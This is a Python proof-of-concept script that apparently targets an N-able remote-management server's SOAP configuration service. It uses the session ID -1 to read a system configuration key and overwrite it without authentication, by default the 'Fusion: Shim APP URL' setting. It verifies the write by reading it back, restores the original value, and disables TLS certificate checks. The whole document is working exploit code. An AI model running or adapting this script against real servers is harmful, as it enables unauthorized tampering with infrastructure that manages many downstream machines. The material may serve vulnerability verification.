#!/usr/bin/env python3
import argparse
import html
import xml.etree.ElementTree as ET

import requests
import urllib3


def get_body(key, sid=-1):
    return f'''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:m="http://www.n-able.com/mickey"><soap:Body>
 <m:SysConfig.Get soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
 <SessionID xsi:type="xsd:int">{sid}</SessionID>
 <KeysLike xsi:type="xsd:string">{html.escape(key)}</KeysLike>
 </m:SysConfig.Get></soap:Body></soap:Envelope>'''


def set_body(key, value, sid=-1):
    return f'''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:m="http://www.n-able.com/mickey">
 <soap:Body><m:SysConfig.Set soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
 <SessionID xsi:type="xsd:int">{sid}</SessionID>
 <ConfigArray xsi:type="m:ArrayOf_tns1_T_ConfigValue" soapenc:arrayType="m:T_ConfigValue[1]">
 <item xsi:type="m:T_ConfigValue"><pKey xsi:type="xsd:string">{html.escape(key)}</pKey>
 <pValue xsi:type="xsd:string">{html.escape(value)}</pValue>
 <Description xsi:type="xsd:string" xsi:nil="true"/>
 <Datatype xsi:type="xsd:string" xsi:nil="true"/>
 </item></ConfigArray></m:SysConfig.Set></soap:Body></soap:Envelope>'''


class Client:
    def __init__(self, target):
        self.url = target.rstrip("/") + "/dms/services/ServerUI"
        self.http = requests.Session()
        self.http.verify = False
        self.http.headers.update({"Content-Type": "text/xml; charset=UTF-8", "SOAPAction": '""'})

    def post(self, data):
        return self.http.post(self.url, data=data, timeout=30)

    def get(self, key):
        response = self.post(get_body(key))
        response.raise_for_status()
        for node in ET.fromstring(response.content).iter():
            if node.tag.rsplit("}", 1)[-1] != "ConfigArray":
                continue
            row = {child.tag.rsplit("}", 1)[-1]: child.text or "" for child in node}
            if row.get("pKey") == key:
                return row.get("pValue", "")
        raise RuntimeError("configuration key was not returned")

    def set(self, key, value, sid=-1):
        return self.post(set_body(key, value, sid))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="https://192.168.1.14")
    parser.add_argument("--key", default="Fusion: Shim APP URL")
    parser.add_argument("--value", required=True)
    args = parser.parse_args()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    client = Client(args.target)
    original = client.get(args.key)
    changed = False
    try:
        control = client.set(args.key, args.value, 2147483646)
        if control.status_code < 400 or client.get(args.key) != original:
            raise RuntimeError("invalid-session control failed")
        print(f"invalid_session_http={control.status_code}")
        response = client.set(args.key, args.value)
        response.raise_for_status()
        changed = True
        observed = client.get(args.key)
        print(f"readback_matches_requested={observed == args.value}")
        return 0 if observed == args.value else 1
    finally:
        if changed:
            client.set(args.key, original).raise_for_status()
            print(f"restored={client.get(args.key) == original}")


if __name__ == "__main__":
    raise SystemExit(main())
